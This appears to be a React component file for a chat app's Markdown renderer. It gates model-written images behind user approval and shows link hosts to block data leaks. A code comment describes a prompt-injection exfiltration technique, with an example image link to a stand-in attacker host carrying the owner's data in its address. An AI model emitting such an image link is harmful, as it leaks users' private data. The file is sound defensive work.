import { createContext, useCallback, useContext, useState, type ComponentPropsWithoutRef, type FC, type ReactNode } from "react";
import {
  MarkdownTextPrimitive,
  unstable_memoizeMarkdownComponents as memoizeMarkdownComponents,
  useIsMarkdownCodeBlock,
  type CodeHeaderProps,
} from "@assistant-ui/react-markdown";
import remarkGfm from "remark-gfm";
import { CheckIcon, CopyIcon } from "lucide-react";

import { TooltipIconButton } from "@/components/assistant-ui/tooltip-icon-button";
import { allowImage, useConversationMarked, useImageAllowed } from "@/lib/imageGate";
import { cn } from "@/lib/utils";

const useCopyToClipboard = ({
  copiedDuration = 1500,
}: {
  copiedDuration?: number;
} = {}) => {
  const [isCopied, setIsCopied] = useState(false);

  const copyToClipboard = useCallback(
    (value: string) => {
      if (!value) return;
      navigator.clipboard.writeText(value).then(() => {
        setIsCopied(true);
        setTimeout(() => setIsCopied(false), copiedDuration);
      });
    },
    [copiedDuration],
  );

  return { isCopied, copyToClipboard };
};

const CodeHeader: FC<CodeHeaderProps> = ({ language, code }) => {
  const { isCopied, copyToClipboard } = useCopyToClipboard();
  const onCopy = () => {
    if (!code || isCopied) return;
    copyToClipboard(code);
  };

  return (
    <div className="flex items-center justify-between gap-4 rounded-t-lg border border-b-0 border-border bg-muted px-4 py-2 text-xs font-medium text-muted-foreground">
      <span className="lowercase">{language ?? "code"}</span>
      <TooltipIconButton tooltip="Copy" onClick={onCopy} className="size-6">
        {isCopied ? <CheckIcon /> : <CopyIcon />}
      </TooltipIconButton>
    </div>
  );
};

// Text a model wrote is untrusted. A Markdown image is fetched the moment it renders, with no click, so an injected
// `![](https://evil.example/?d=<owner data>)` would send whatever the model put in the address. In a chat that has not
// touched the owner's data or other sites' content (lib/imageGate.ts) there is nothing to send and images load as
// usual. Once it has, an image shows its full address and asks first, one address at a time, and no `src` reaches the
// DOM until it is allowed. A link shows its full host beside the label, so the label cannot hide where it goes. Raw
// HTML is not rendered (there is no rehype-raw), so these two components are the only way model Markdown reaches a URL.

/** The conversation the reply belongs to. Without one (a shared or unknown view) every image asks first. */
const ImageGateContext = createContext<string | null>(null);
export const ImageGateScope: FC<{ threadId: string | undefined; children: ReactNode }> = ({ threadId, children }) => (
  <ImageGateContext.Provider value={threadId ?? null}>{children}</ImageGateContext.Provider>
);

function webHost(value: unknown): string | null {
  if (typeof value !== "string") return null;
  try {
    const url = new URL(value);
    return url.protocol === "http:" || url.protocol === "https:" ? url.host : null;
  } catch {
    return null;
  }
}

const notLoaded = (alt: string | undefined, host: string | null) =>
  `Image not loaded${alt ? `: ${alt}` : ""}${host ? ` (${host})` : ""}`;

const ModelImage: FC<ComponentPropsWithoutRef<"img">> = ({ src, alt }) => {
  const threadId = useContext(ImageGateContext);
  const host = webHost(src);
  const address = host && typeof src === "string" ? src : null;
  const marked = useConversationMarked(threadId);
  const allowed = useImageAllowed(threadId, address);
  const [dismissed, setDismissed] = useState(false);
  if (!address || !host) return <span className="text-muted-foreground">{notLoaded(alt, host)}</span>;
  if (!marked || allowed) {
    return <img src={address} alt={alt ?? ""} loading="lazy" decoding="async" referrerPolicy="no-referrer" className="my-2 h-auto max-w-full rounded-lg" />;
  }
  if (dismissed) return <span className="text-muted-foreground">{notLoaded(alt, host)}</span>;
  const button = "min-h-9 rounded-full border border-border px-3 text-sm font-medium hover:bg-accent";
  return (
    <span role="group" aria-label={`Load this image? ${address}`} className="my-2 block rounded-lg border border-border p-3">
      <span className="block text-muted-foreground">{notLoaded(alt, host)}</span>
      <span className="mt-1 block font-medium text-foreground">Load this image?</span>
      <span className="block break-all font-mono text-xs text-foreground">{address}</span>
      <span className="mt-1 block text-xs text-muted-foreground">
        This chat includes your data or content from other sites. Loading the image sends its full address to {host}.
      </span>
      <span className="mt-2 flex gap-2">
        <button type="button" aria-label="Load this image" className={button} onClick={() => allowImage(threadId, address)}>Load</button>
        <button type="button" className={button} onClick={() => setDismissed(true)}>Not now</button>
      </span>
    </span>
  );
};

/** The text of a link's label when it is plain text, else null. */
function labelText(children: ReactNode): string | null {
  if (typeof children === "string") return children;
  if (Array.isArray(children) && children.every((child) => typeof child === "string")) return children.join("");
  return null;
}

const ModelLink: FC<ComponentPropsWithoutRef<"a">> = ({ href, children }) => {
  const host = webHost(href);
  // Not a web address (a fragment, a mail or phone link): nothing to open from here, so only its text shows.
  if (!host) return <span>{children}</span>;
  // A label that already starts with the host (the address itself, or the host name) says it once.
  const label = labelText(children)?.trim().toLowerCase().replace(/^https?:\/\//, "");
  const named = label !== undefined && label !== null && (label === host || label.startsWith(`${host}/`));
  return (
    <>
      <a href={href} target="_blank" rel="noopener noreferrer nofollow" referrerPolicy="no-referrer">
        {children}
      </a>
      {named ? null : <>{" "}<span className="whitespace-nowrap text-xs text-muted-foreground">({host})</span></>}
    </>
  );
};

const defaultComponents = memoizeMarkdownComponents({
  CodeHeader,
  img: ModelImage,
  a: ModelLink,
  pre: ({ className, ...props }) => (
    <pre
      className={cn(
        "overflow-x-auto rounded-b-lg border border-border bg-muted p-4 text-sm",
        className,
      )}
      {...props}
    />
  ),
  code: function Code({ className, ...props }) {
    const isCodeBlock = useIsMarkdownCodeBlock();
    return (
      <code
        className={cn(
          !isCodeBlock &&
            "rounded border border-border bg-muted px-1.5 py-0.5 font-mono text-[0.85em]",
          className,
        )}
        {...props}
      />
    );
  },
});

const MarkdownTextImpl: FC = () => {
  return (
    <MarkdownTextPrimitive
      remarkPlugins={[remarkGfm]}
      components={defaultComponents}
      className="prose prose-sm max-w-none break-words text-foreground prose-headings:text-foreground prose-strong:text-foreground prose-a:text-foreground prose-code:text-foreground prose-pre:my-0 prose-pre:bg-transparent prose-pre:p-0 dark:prose-invert"
    />
  );
};

export const MarkdownText = MarkdownTextImpl;
